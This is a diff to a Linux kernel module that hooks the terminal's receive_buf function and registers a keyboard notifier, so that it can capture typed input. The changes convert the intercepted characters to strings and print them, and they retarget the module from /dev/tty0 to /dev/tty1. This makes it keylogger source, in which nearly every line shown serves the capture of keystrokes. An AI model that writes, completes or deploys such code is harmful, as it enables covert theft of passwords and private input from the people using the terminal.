@@ -1,14 +1,15 @@
 #include <linux/init.h>
 #include <linux/module.h>
-#include <linux/kernel.h> /* printk() */
-#include <linux/slab.h> /* kmalloc() */
-#include <linux/fs.h> /* everything... */
-#include <linux/errno.h> /* error codes */
-#include <linux/types.h> /* size_t */
+#include <linux/kernel.h>   /* printk() */
+#include <linux/slab.h>     /* kmalloc() */
+#include <linux/fs.h>       /* everything... */
+#include <linux/errno.h>    /* error codes */
+#include <linux/types.h>    /* size_t */
 #include <linux/proc_fs.h>
-#include <linux/fcntl.h> /* O_ACCMODE */
-#include <asm/system.h> /* cli(), *_flags */
-#include <asm/uaccess.h> /* copy_from/to_user */
+#include <linux/fcntl.h>    /* O_ACCMODE */
+#include <asm/system.h>     /* cli(), *_flags */
+#include <asm/uaccess.h>    /* copy_from/to_user */
+#include <asm/string.h>     /* strncpy */
 
 #include <linux/keyboard.h> /* register_keyboard_notifier etc */
 #include <linux/tty.h>
@@ -82,23 +83,25 @@ struct file* file_open(const char* path, int flags, int rights) {
         return NULL;
     }
 
-    return filp;
-    
+    return filp;   
 }
 
-void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
-                        char *fp, int count)
+void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
-    //print812("%c", fp[0]);
-    //print812("%d ", count);
     if(count > 0)
     {
-        //We need to copy the correct number of characters from cp based on count
-        print812("%d : %c", count, cp[0]);
-    }
+        if (!tty->real_raw && !tty->raw)
+        {
+            char dstStr[count + 1];
+            strncpy(dstStr, cp, count);
+            dstStr[count] = '\0';
+            
+            char* outStr = get_tty_key_str(dstStr, count);   
+            //char* outStr = "FakeString";
 
-    //print812("%s", cp);
-    //logging(tty, cp, count);    //log inputs
+            print812("%d : %s", count, outStr);
+        }
+    }
 
     /* call the original receive_buf */
     (*old_receive_buf)(tty, cp, fp, count);
@@ -147,7 +150,7 @@ static int hello_init( void ) {
 
     register_keyboard_notifier(&keyboardNotifierBlock);
     
-    file = file_open("/dev/tty0", O_RDONLY, 0);
+    file = file_open("/dev/tty1", O_RDONLY, 0);
     if(file != NULL)
     {
         tty = file->private_data;
